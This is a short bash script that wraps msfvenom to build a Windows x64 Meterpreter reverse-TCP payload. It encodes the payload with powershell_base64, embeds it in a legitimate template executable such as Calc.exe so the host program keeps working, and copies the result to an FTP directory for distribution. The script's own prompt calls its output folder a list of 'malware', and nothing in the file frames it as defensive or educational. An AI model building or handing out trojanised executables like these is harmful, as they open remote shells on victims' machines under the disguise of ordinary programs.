#MSFVenom Powershell x64 
#$varTemplate provide a MS Exe eg Calc.exe 
#Use meter.sh to create the reverse meterpreter shell 

echo "Enter the number of iterations of encoding"
read varEncode
echo " "
l=(ls)

i=ifconfig

g=$($i | grep "inet " | grep -v "127" | sed 's/inet//g' | sed 's/  netmask 255.255.255.0  broadcast *.*.*.*//g')
echo "This is the current IP...." $g
echo "Enter the IP"
read varIP
echo " "
echo "Enter the Local Port eg 443"
read varLPort
echo " "
echo "This is a list of the current .exe's"
echo " "
$l *.exe

echo " "

echo "Enter the name of one of the .exe's listed, aka Template"
read varTemplate

echo " "
echo "Current list of malware"
$l ./Output
echo " "

echo "Name of Output file inc exetension"
read varOutFile

#msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -platform windows -e cmd/powershell_base64 -i $varEncode LHOST=$g LPORT=$varLPort -f exe -x ./$varTemplate -k > Output/$varOutFile 

msfvenom -p windows/x64/meterpreter/reverse_tcp -e cmd/powershell_base64 -i $varEncode LHOST=$varIP LPORT=$varLPort -f exe -x ./$varTemplate -k > Output/$varOutFile 

cp Output/$varOutFile /srv/ftp




